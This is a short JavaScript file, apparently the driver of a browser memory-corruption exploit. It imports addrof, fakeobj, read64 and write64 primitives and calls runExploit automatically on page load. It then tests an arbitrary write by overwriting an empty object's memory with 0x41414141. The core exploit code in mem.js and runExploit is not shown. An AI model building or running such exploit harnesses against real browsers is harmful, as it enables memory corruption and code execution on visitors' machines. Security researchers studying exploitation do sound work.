// main.js
import { addrof, fakeobj, read64, write64 } from './mem.js';

function log(msg) {
    const logDiv = document.getElementById('log');
    logDiv.textContent += msg + '\n';
    void logDiv.offsetHeight;
}

window.onload = async function() {
    log('Starting exploit...');
    try {
        await window.runExploit(log);
        log('Exploit complete!');
        var goofy = {};
        var emptyObjectAddr = addrof(goofy);
        write64(emptyObjectAddr, 0x41414141n);
        log("[MTEST] obj dat: " + goofy);
    } catch(e) {
        log('Exploit failed: ' + e);
    }
};
